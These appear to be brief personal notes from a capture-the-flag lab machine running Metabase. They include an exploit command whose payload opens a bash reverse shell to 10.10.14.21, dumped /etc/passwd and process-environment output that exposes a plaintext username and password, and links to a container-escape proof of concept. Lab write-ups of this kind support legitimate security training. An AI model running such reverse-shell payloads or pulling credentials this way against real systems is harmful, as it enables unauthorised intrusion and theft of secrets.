## Command
```bash
python3 main.py -u "http://data.analytical.htb" -t "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" -c "bash -i >&/dev/tcp/10.10.14.21/9998 0>&1"
```

## /etc/passwd
```bash
root:x:0:0:root:/root:/bin/ash  
bin:x:1:1:bin:/bin:/sbin/nologin  
daemon:x:2:2:daemon:/sbin:/sbin/nologin  
adm:x:3:4:adm:/var/adm:/sbin/nologin  
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin  
sync:x:5:0:sync:/sbin:/bin/sync  
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown  
halt:x:7:0:halt:/sbin:/sbin/halt  
mail:x:8:12:mail:/var/mail:/sbin/nologin  
news:x:9:13:news:/usr/lib/news:/sbin/nologin  
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin  
operator:x:11:0:operator:/root:/sbin/nologin  
man:x:13:15:man:/usr/man:/sbin/nologin  
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin  
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin  
ftp:x:21:21::/var/lib/ftp:/sbin/nologin  
sshd:x:22:22:sshd:/dev/null:/sbin/nologin  
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin  
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin  
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin  
games:x:35:35:games:/usr/games:/sbin/nologin  
cyrus:x:85:12::/usr/cyrus:/sbin/nologin  
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin  
ntp:x:123:123:NTP:/var/empty:/sbin/nologin  
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin  
guest:x:405:100:guest:/dev/null:/sbin/nologin  
nobody:x:65534:65534:nobody:/:/sbin/nologin  
metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash
```


## /proc/self/environ
```
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=717bd4b3c100
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase  
.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=3
MB_DB_USER=
FC_LANG=en-USLD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../l  
ib
LC_CTYPE=en_US.UTF-8MB_LDAP_BIND_DN=LC_ALL=en_US.UTF-8MB_LDAP_PASSWORD=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/u  
sr/bin:/sbin:/binMB_DB_CONNECTION_URI=JAVA_VERSION=jdk-11.0.19+7_=/bin/bash717bd4b3c100:/proc/self$
```


## Wtf exploit
https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/

## Exploit after root
https://github.com/Frichetten/CVE-2019-5736-PoC/tree/master